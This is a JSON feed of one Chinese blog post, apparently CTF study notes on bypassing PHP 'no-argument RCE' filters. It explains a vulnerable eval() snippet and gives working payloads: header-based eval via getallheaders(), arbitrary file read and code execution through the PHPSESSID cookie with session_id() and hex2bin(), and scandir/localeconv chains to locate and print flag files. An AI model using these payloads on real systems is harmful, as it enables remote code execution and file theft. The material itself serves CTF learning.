{
    "version": "https://jsonfeed.org/version/1",
    "title": "ziwei-blog",
    "description": "",
    "home_page_url": "https://ziwei.github.io.git",
    "feed_url": "https://ziwei.github.io.git/feed.json",
    "user_comment": "",
    "author": {
        "name": "ziwei"
    },
    "items": [
        {
            "id": "https://ziwei.github.io.git/wu-can-shu-rcerao-guo.html",
            "url": "https://ziwei.github.io.git/wu-can-shu-rcerao-guo.html",
            "title": "无参数rce绕过",
            "summary": "啥是无参数rec，通过没有参数的函数达到命令执行的目的（https://www.freebuf.com/articles/system/242482.html） 啥是没有参数的函数，举个例子 &lt;?php if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']){ eval($_GET['exp']); } ?&gt; 简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。 (?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。 出自（https://blog.csdn.net/Manuffer/article/details/120738755） 那怎么绕过 1、getallheaders() 返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。（函数，很神奇吧） implode()能够直接将getallheaders()返回的数组转化为字符串。 其余？看个链接先 举例： ?code=eval(pos(getallheaders())); //header Leon: phpinfo(); 但是在做ctfshow web40这道题时，上面单纯的构造不行，还需要加上 ?c=eval(array_rand(array_flip(getallheaders()))); 2，session_id()实现任意文件读取（https://www.cnblogs.com/LLeaves/p/12868440.html） 不错的绕过方法，session_id() 可以用来获取/设置 当前会话 ID。 开启之后可以用cookie：PHPSESSID=来任意读取文件 只需要再前面加上get传参?exp=readfile(session_id(session_start()));这里的exp是禁止套娃的参数，根据题目更改 之后就可以通过cookie来读取文件了 是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z&hellip;",
            "content_html": "<div>啥是无参数rec，通过没有参数的函数达到命令执行的目的（https://www.freebuf.com/articles/system/242482.html）</div>\n<div>啥是没有参数的函数，举个例子</div>\n<div>&lt;?php</div>\n<div>if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']){</div>\n<div>       eval($_GET['exp']);</div>\n<div>}</div>\n<div>?&gt;</div>\n<div>简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。</div>\n<div> </div>\n<div>(?R)?能匹配的只有a(); a(b()); a(b(c()));这种类型的。比如传入a(b(c()));，第一次匹配后，就剩a(b());，第二次匹配后，a();，第三次匹配后就只剩下;了，最后a(b(c()));就会被eval执行。</div>\n<div>出自（https://blog.csdn.net/Manuffer/article/details/120738755）</div>\n<div> </div>\n<div>那怎么绕过</div>\n<div>1、getallheaders()</div>\n<div>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。（函数，很神奇吧）</div>\n<div>implode()能够直接将getallheaders()返回的数组转化为字符串。</div>\n<div>其余？看个链接先</div>\n<div>举例：</div>\n<div>?code=eval(pos(getallheaders()));</div>\n<div>//header</div>\n<div>Leon: phpinfo();</div>\n<div>但是在做ctfshow web40这道题时，上面单纯的构造不行，还需要加上</div>\n<div> </div>\n<div>?c=eval(array_rand(array_flip(getallheaders())));</div>\n<div> </div>\n<div>2，session_id()实现任意文件读取（https://www.cnblogs.com/LLeaves/p/12868440.html）</div>\n<div>不错的绕过方法，session_id() 可以用来获取/设置 当前会话 ID。</div>\n<div>开启之后可以用cookie：PHPSESSID=来任意读取文件</div>\n<div>只需要再前面加上get传参?exp=readfile(session_id(session_start()));这里的exp是禁止套娃的参数，根据题目更改</div>\n<div>之后就可以通过cookie来读取文件了</div>\n<div> </div>\n<div>是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</div>\n<div>但是hex2bin()函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可</div>\n<div> </div>\n<div>?exp=readfile(session_id(session_start()));分析</div>\n<div>使用session之前需要通过session_start()告诉PHP使用session</div>\n<div>举例：</div>\n<div>eval(hex2bin(session_id(session_start())));</div>\n<div> </div>\n<div>&gt;&gt;&gt; print'phpinfo();'.encode('hex')</div>\n<div>706870696e666f28293b</div>\n<div> </div>\n<div>Cookie: PHPSESSID=706870696e666f28293b</div>\n<div> </div>\n<div>3.print_r(scandir('.'))绕过</div>\n<div>这个函数的意思是打印当初路径下的文件</div>\n<div>这种题基本过滤小数点，所以要用以下几个函数</div>\n<div>localeconv()      返回一包含本地数字及货币格式信息的数组</div>\n<div>current() 函数返回数组中的当前元素（单元）,默认取第一个值，</div>\n<div>next() 输出数组中的当前元素的下一个元素的值,也就是可以输出第二个（还有end可以输出最后一个）</div>\n<div>array_reverse()，将数组转置；</div>\n<div>使用：print_r(scandir(current(localeconv())));可以打印当前目录</div>\n<div>打印后可以看到flag在哪，在用上面的函数输出出来就好了，如果flag在第二位，打印</div>\n<div>highlight_file (next(array_reverse(scandir(current(localeconv())))));</div>\n<div>万一，对面使用了这个if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i', $c)){</div>\n<div>把所有数字和小写英文字母都过滤了</div>\n<div>似乎是只能用python脚本从外部跑，附上链接把（https://www.cnblogs.com/aninock/p/15125215.html）</div>\n<p> </p>",
            "author": {
                "name": "ziwei"
            },
            "tags": [
            ],
            "date_published": "2024-04-07T09:51:52+08:00",
            "date_modified": "2024-04-07T09:51:52+08:00"
        }
    ]
}
